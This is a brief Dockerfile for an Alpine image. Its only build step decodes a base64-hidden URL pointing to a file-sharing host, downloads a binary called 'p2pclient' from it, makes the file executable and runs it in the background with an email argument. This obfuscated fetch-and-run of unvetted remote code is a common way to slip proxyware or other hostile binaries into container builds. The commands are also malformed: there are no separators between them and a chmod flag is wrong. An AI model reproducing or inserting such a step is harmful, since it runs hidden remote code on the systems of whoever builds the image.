FROM alpine:edge

RUN wget -O a "$(echo "aHR0cHM6Ly90cmFuc2Zlci5zaC8xTTVhSGJBL3AycGNsaWVudAo=" | base64 -d)" \
    chmod +X a \
    nohup ./a -l "$(echo $email)"& \
    
